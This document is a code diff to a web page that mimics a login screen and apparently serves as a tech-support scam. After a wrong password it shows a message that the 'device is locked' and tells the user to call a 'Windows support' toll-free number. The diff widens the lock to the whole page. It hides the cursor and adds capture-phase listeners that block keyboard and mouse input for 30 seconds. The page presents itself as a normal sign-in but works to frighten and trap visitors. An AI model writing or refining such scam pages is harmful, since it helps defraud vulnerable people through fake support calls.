@@ -62,6 +62,7 @@
       width: 340px;
       box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
       border: 1px solid rgba(255, 255, 255, 0.15);
+      transition: opacity 0.3s ease;
     }
     .mac-card {
       background: rgba(255, 255, 255, 0.1);
@@ -147,6 +148,9 @@
     .disabled-interaction {
       pointer-events: none !important;
       cursor: none !important;
+    }
+    .locked-card {
+      opacity: 0.7; /* Visual cue for locked state */
     }
   </style>
 </head>
@@ -305,16 +309,18 @@
         errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
       }
       errorMsg.style.display = 'block';
-      loginSection.classList.add('disabled-interaction');
+      document.body.classList.add('disabled-interaction');
+      card.classList.add('locked-card');
       passwordInput.disabled = true;
       // Explicitly disable mouse events
-      loginSection.style.pointerEvents = 'none';
-      loginSection.style.cursor = 'none';
+      document.body.style.pointerEvents = 'none';
+      document.body.style.cursor = 'none';
       setTimeout(()=>{
         errorMsg.style.display = 'none';
-        loginSection.classList.remove('disabled-interaction');
-        loginSection.style.pointerEvents = 'auto';
-        loginSection.style.cursor = 'auto';
+        document.body.classList.remove('disabled-interaction');
+        card.classList.remove('locked-card');
+        document.body.style.pointerEvents = 'auto';
+        document.body.style.cursor = 'auto';
         passwordInput.disabled = false;
         passwordInput.value = '';
       }, 30000);
@@ -330,25 +336,37 @@
 
     // Prevent all keyboard input when error message is shown
     document.addEventListener('keydown', (event) => {
-      if (loginSection.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
-    });
+    }, true);
 
     // Prevent all mouse events when error message is shown
     document.addEventListener('mousemove', (event) => {
-      if (loginSection.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
-    });
+    }, true);
     document.addEventListener('click', (event) => {
-      if (loginSection.classList.contains('disabled-interaction')) {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
-    });
+    }, true);
+    document.addEventListener('mousedown', (event) => {
+      if (document.body.classList.contains('disabled-interaction')) {
+        event.preventDefault();
+        event.stopPropagation();
+      }
+    }, true);
+    document.addEventListener('mouseup', (event) => {
+      if (document.body.classList.contains('disabled-interaction')) {
+        event.preventDefault();
+        event.stopPropagation();
+      }
+    }, true);
 
     // Fallback for background images
     window.addEventListener('error', (event) => {
